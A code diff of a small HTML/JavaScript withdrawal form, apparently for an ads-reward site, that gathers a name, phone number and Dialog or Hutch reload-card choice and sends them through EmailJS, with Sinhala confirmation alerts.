@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>ads play Site Withdraw Form</title>
+  <title>Withdraw Form</title>
   <style>
     body {
       background-color: #000;
@@ -80,6 +80,10 @@
       margin-top: 10px;
       border-radius: 10px;
     }
+
+    #cardTypeContainer {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -89,39 +93,46 @@
 
   <div id="popupDialog">
     <form id="popupForm">
+      
+      <div id="cardTypeContainer">
+        <div class="field">
+          <label for="cardType">Select Card</label>
+          <select id="cardType" onchange="updateCardDetails()" required>
+            <option value="">-- Select --</option>
+            <option value="dialog">Dialog Card</option>
+            <option value="hutch">Hutch Card</option>
+          </select>
+        </div>
+        <img id="cardImage" src="" alt="Card Image" style="display:none;">
+      </div>
+
       <div class="field">
         <label for="name">Name</label>
         <input type="text" id="name" required>
       </div>
-      <div class="field">
-        <label for="time">Time (Auto)</label>
+
+      <div class="field" id="timeField">
+        <label for="time">Time</label>
         <input type="text" id="time" readonly>
       </div>
+
       <div class="field">
         <label for="message">Message</label>
         <input type="text" id="message" required>
       </div>
+
       <div class="field">
         <label for="title">Title</label>
         <input type="text" id="title" required>
       </div>
+
       <div class="field">
         <label for="number">Number</label>
         <input type="text" id="number" required>
       </div>
 
-      <div class="field">
-        <label for="cardType">Card Type</label>
-        <select id="cardType" onchange="updateCardImage()" required>
-          <option value="">-- Select Card --</option>
-          <option value="dialog">Dialog Card</option>
-          <option value="hutch">Hutch Card</option>
-        </select>
-        <img id="cardImage" src="" alt="Card Image" style="display:none;">
-      </div>
-
       <input type="submit" class="button" value="Send Email">
-      <div id="popupFooter">2025 - 2025 Made By King Ꮇᴀꜰɪᴀ | KING MS</div>
+      <div id="popupFooter">2025 - Made by King Mafia | KING MS</div>
       <button type="button" id="closeBtn" onclick="closeDialog()">Close</button>
     </form>
   </div>
@@ -133,16 +144,20 @@
     const form = document.getElementById('popupForm');
     const timeInput = document.getElementById('time');
     const cardImage = document.getElementById('cardImage');
-    const cardType = document.getElementById('cardType');
+    const cardTypeSelect = document.getElementById('cardType');
+    const titleInput = document.getElementById('title');
+    const timeField = document.getElementById('timeField');
+    const cardTypeContainer = document.getElementById('cardTypeContainer');
 
     const cardImages = {
-      dialog: 'https://your-image-url.com/dialog-card.png', // මෙතන Dialog Card photo URL එක දාන්න
-      hutch: 'https://your-image-url.com/hutch-card.png'    // මෙතන Hutch Card photo URL එක දාන්න
+      dialog: 'https://i.imgur.com/VXzG2uk.png', // <-- Dialog card photo URL
+      hutch: 'https://i.imgur.com/EKZMpT8.png'   // <-- Hutch card photo URL
     };
 
     function openDialog() {
       document.getElementById('popupDialog').style.display = 'block';
       setCurrentTime();
+      cardTypeContainer.style.display = 'block';
     }
 
     function closeDialog() {
@@ -154,42 +169,49 @@
       timeInput.value = now.toLocaleString();
     }
 
-    function updateCardImage() {
-      const selected = cardType.value;
-      if (selected && cardImages[selected]) {
-        cardImage.src = cardImages[selected];
-        cardImage.style.display = 'block';
+    function updateCardDetails() {
+      const selected = cardTypeSelect.value;
+      if (selected === "dialog") {
+        titleInput.value = "Dialog Reload";
+        timeField.style.display = "none";
+        cardImage.src = cardImages.dialog;
+        cardImage.style.display = "block";
+      } else if (selected === "hutch") {
+        titleInput.value = "Hutch Reload";
+        timeField.style.display = "none";
+        cardImage.src = cardImages.hutch;
+        cardImage.style.display = "block";
       } else {
-        cardImage.style.display = 'none';
+        titleInput.value = "";
+        timeField.style.display = "block";
+        cardImage.style.display = "none";
       }
     }
 
     form.addEventListener('submit', function(e) {
       e.preventDefault();
-      setCurrentTime();
 
       const formData = {
         name: document.getElementById('name').value,
         time: timeInput.value,
         message: document.getElementById('message').value,
-        title: document.getElementById('title').value,
+        title: titleInput.value,
         number: document.getElementById('number').value,
-        cardType: cardType.value,
-        cardImage: cardImages[cardType.value] || 'N/A',
+        cardType: cardTypeSelect.value
       };
 
       emailjs.send("service_2wht3tb", "template_jrstb44", formData)
         .then(() => {
           alert("✅ Email Sent Successfully!");
           alert("ඔබගෙ යිල්ලිම පැය24 ක් ඇතුලත යිටු වෙවි!");
-          alert("අපගෙ සෙවාව බාවිතා කර ඔබට අපගෙ ස්තූතිය!")
           form.reset();
           cardImage.style.display = 'none';
-          setCurrentTime();
+          timeField.style.display = 'block';
+          cardTypeContainer.style.display = 'none';
           closeDialog();
         })
         .catch((error) => {
-          console.error("❌ Failed to send email:", error);
+          console.error("❌ Error sending email:", error);
           alert("❌ Error sending email. Check console.");
         });
     });
